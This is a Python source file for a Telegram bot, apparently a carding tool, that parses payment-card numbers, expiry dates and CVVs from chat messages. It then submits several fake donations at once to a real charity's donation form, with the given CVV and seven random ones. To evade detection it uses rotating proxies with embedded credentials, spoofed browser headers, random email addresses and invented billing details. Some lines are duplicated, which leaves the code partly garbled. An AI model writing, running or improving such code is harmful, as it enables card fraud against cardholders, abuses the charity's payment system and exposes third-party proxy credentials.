import requests
import re
import unicodedata
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# --- existing logging / proxies / user-agents (unchanged) ---
# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more Webshare proxy usernames if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# Random User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    """Returns a random User-Agent."""
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    """Generate a random email."""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

def get_fresh_cookies(proxy: dict) -> dict:
    """Fetches fresh cookies from the donation page."""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'user-agent': get_random_user_agent(),
        }
        response = requests.get(
            'https://aasr-indy.org/philanthropy/donate/',
            headers=headers,
            proxies=proxy,
            timeout=5
        )
        cookies = response.cookies.get_dict()
        return cookies  # <-- fixed: return cookies on success
    except Exception as e:
        logger.error(f"Failed to fetch cookies: {str(e)}")
        return {}

# ------------------ NEW: clean_text + updated parser ------------------
def clean_text(raw: str) -> str:
    # Normalize unicode
    text = unicodedata.normalize("NFKC", raw)

    # Remove hidden zero-width characters
    text = re.sub(r'[\u200B\u200C\u200D\u2060\uFEFF\u180E]', '', text)

    # Replace NBSP with normal space
    text = text.replace('\u00A0', ' ')

    # Remove ellipsis
    text = text.replace('\u2026', '')

    # Remove CR and LF explicitly and collapse to spaces
    text = text.replace('\r', ' ').replace('\n', ' ')
    text = re.sub(r'\s+', ' ', text).strip()

    return text

# Backwards-compatibility alias: some modules (or older code) call `ultra_clean`.
# Keep a small alias so callers using the old name keep working.
ultra_clean = clean_text

def parse_card_input(raw: str) -> str:
    """
    Clean input and extract card number (16-19 digits), expiry MM/YY, and a 3-digit CVV.
    Returns normalized string: cc|mm|yy|cvv
    Raises ValueError if parsing fails.
    """
    text = clean_text(raw).lower()

    # CARD: 16–19 digits (prefer contiguous sequence)
    card_match = re.search(r'\b\d{16,19}\b', text)
    if not card_match:
        # Try to find a card number made of several adjacent digit runs
        # but only join runs that are separated by spaces or hyphens (avoid joining into expiry/cvv tokens).
        runs = list(re.finditer(r'\d+', text))
        cc = None
        for i in range(len(runs)):
            cand = runs[i].group()
            # try to extend up to 5 consecutive runs (covers typical groupings)
            for j in range(i+1, min(i+6, len(runs))):
                # ensure the text between runs[j-1] and runs[j] contains only spaces or hyphens
                inter = text[runs[j-1].end():runs[j].start()]
                if not inter or all(ch in ' -' for ch in inter):
                    cand += runs[j].group()
                else:
                    break
                if 16 <= len(cand) <= 19:
                    cc = cand
                    break
            if cc:
                break
        if not cc:
            raise ValueError("Card not found")
    else:
        cc = card_match.group(0)

    # EXPIRY: accept MM/YY, MM-YY, MM|YY, MM/YYYY (also 4-digit year)
    expiry = re.search(r'\b(0?[1-9]|1[0-2])\s*(?:[\/\-\|])\s*(\d{2,4})\b', text)
    if not expiry:
        # fallback: look for tokens like "mm yy" or "mm yyyy" possibly on separate tokens
        # collect 1-4 digit numeric tokens (this keeps groups like '4701' but we'll filter them)
        tokens = re.findall(r'\d{1,4}', text)
        # remove obvious card-digit chunks (first/last 4 and full card)
        filter_out = {cc, cc[:4], cc[-4:]}
        tokens = [t for t in tokens if t not in filter_out]
        found = False
        for i in range(len(tokens)-1):
            a, b = tokens[i], tokens[i+1]
            try:
                ai = int(a)
            except ValueError:
                continue
            # Accept following year formats: 2-digit or 4-digit
            if 1 <= ai <= 12 and len(b) in (2, 4):
                mm = str(ai).zfill(2)
                yy = b[-2:]
                found = True
                break
        if not found:
            raise ValueError("Expiry not found")
    else:
        mm = expiry.group(1).zfill(2)
        yy = expiry.group(2)
        # normalize 4-digit years to last two digits
        if len(yy) == 4:
            yy = yy[-2:]

    # CVV: prefer labeled patterns, else first 3-digit group not part of card/expiry
    cvv = None
    # allow slightly more spacing/characters between label and digits
    cvv_label = re.search(r'(?:cvv|cvc|cvn|security code|cvv code|cvc code)[^\d]{0,10}(\d{3,4})', text, flags=re.I)
    if cvv_label:
        cvv = cvv_label.group(1)
    else:
        # find 3 or 4 digit groups
        candidates = re.findall(r'\b\d{3,4}\b', text)
        # build blacklist to avoid picking parts of the card or the expiry
        blacklist = {cc, cc[:4], cc[-4:], mm.lstrip('0'), mm, yy, ('20' + yy) if len(yy) == 2 else yy}
        for c in candidates:
            # skip if the candidate is part of the card number string
            if c in cc:
                continue
            if c.lstrip('0') in blacklist or c in blacklist:
                continue
            # prefer 3-digit CVV
            if len(c) == 3:
                cvv = c
                break
            # accept 4-digit only if no 3-digit present
            if len(c) == 4 and cvv is None:
                cvv = c

    if not cvv:
        raise ValueError("CVV not found")

    return f"{cc}|{mm}|{yy}|{cvv}"
# ------------------ End parser ------------------

# Backwards-compatibility alias: tests or other modules may import the
# older name `extract_card_data` — keep a thin alias to the current parser.
def extract_card_data(raw: str) -> Tuple[str, str, str, str]:
    """Compatibility wrapper: return a tuple (cc, mm, yy, cvv).

    Older code (or `test_extract.py`) expects `extract_card_data` to return
    four separate values. The current parser returns a normalized string
    "cc|mm|yy|cvv`, so split and return a tuple for compatibility.
    """
    parsed = parse_card_input(raw)
    parts = parsed.split("|")
    if len(parts) != 4:
        raise ValueError("Parsing returned unexpected format")
    return parts[0], parts[1], parts[2], parts[3]

def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    """Processes a single CVV with a fresh session."""
    cc, mm, yy, _ = card_info.split('|')

    # Create fresh session
    with requests.Session() as session:
        # Get fresh cookies
        cookies = get_fresh_cookies(proxy)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://aasr-indy.org',
            'priority': 'u=0, i',
            'referer': 'https://aasr-indy.org/philanthropy/donate/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_random_user_agent(),
        }

        data = {
            'amount': '20',
            'direct_to': 'Cathedral Foundation',
            'type': 'General',
            'memory_of': 'Elizabeth Queen',
            'credit_card': 'Visa',
            'credit_card_number': cc,
            'expiration_month': mm,
            'expiration_year': f"20{yy}",
            'cvv': cvv,
            'billing_first_name': 'Mohammed',
            'billing_last_name': 'Nehal',
            'billing_address': 'New York',
            'billing_city': 'New York',
            'billing_state': 'New York',
            'billing_postal_code': '10040',
            'billing_country': 'United States',
            'billing_telephone': '07975102052',
            'billing_email': generate_random_email(),
            'submit': '1',
            'debug': '1',
        }

        try:
            response = session.post(
                'https://aasr-indy.org/philanthropy/donate/',
                params='',
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )
            match = re.search(r'<p\s+class="attention">\s*(.*?)\s*</p>', response.text)
            msg = match.group(1) if match else "No attention message found"
            logger.info(f"CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"
        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram."""
    user_id = event.sender_id
    chat = await event.get_chat()

    # Try to parse/normalize card input in multiple formats
    try:
        normalized_card = parse_card_input(card_info)
    except ValueError as e:
        await event.reply(f"❌ **Error**: Could not parse card input. {str(e)}\n\nUse format: cc|mm|yy|cvv or give card, expiry (mm/yy) and cvv anywhere in the message.")
        return

    try:
        cc, mm, yy, real_cvv = card_info.split('|')
        cc, mm, yy, real_cvv = normalized_card.split('|')
        if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and real_cvv.isdigit()):
            raise ValueError("Invalid card format")
            raise ValueError("Invalid card format after parsing")
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))
        results = list(executor.map(lambda c, p: process_cvv(normalized_card, c, p), cvvs, proxy_cycle[:len(cvvs)]))

    end_time = time.time()
    total_time = end_time - start_time
    result_message = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"

    # Append each CVV result to the result_message
    for result in results:
        result_message += f"{result}\n"

    result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"

    await processing_msg.edit(result_message)
